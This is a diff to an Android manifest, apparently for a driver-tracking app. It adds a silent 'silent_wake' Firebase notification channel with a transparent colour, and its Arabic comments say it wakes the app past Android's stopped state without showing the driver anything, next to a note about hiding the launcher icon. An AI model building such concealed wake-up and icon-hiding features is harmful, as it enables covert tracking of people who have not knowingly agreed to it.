@@ -53,6 +53,19 @@
             android:name="com.google.android.gms.location.ActivityRecognitionApi"
             android:value="true" />
 
+          <!-- ===== FCM DEFAULT NOTIFICATION CHANNEL (v2.7.2) ===== -->
+          <!-- قناة silent للـ wake-up messages من Cloud Functions -->
+          <!-- تخترق Android FLAG_STOPPED state بدون إظهار شي للسائق -->
+          <meta-data
+              android:name="com.google.firebase.messaging.default_notification_channel_id"
+              android:value="silent_wake" />
+          <meta-data
+              android:name="com.google.firebase.messaging.default_notification_icon"
+              android:resource="@mipmap/ic_launcher" />
+          <meta-data
+              android:name="com.google.firebase.messaging.default_notification_color"
+              android:resource="@android:color/transparent" />
+
         <!-- ===== MAIN ACTIVITY ===== -->
         <!-- ملاحظة: الـ MAIN/LAUNCHER intent-filter انتقل لـ MainActivityAlias عشان نقدر نخفي الأيقونة -->
         <activity
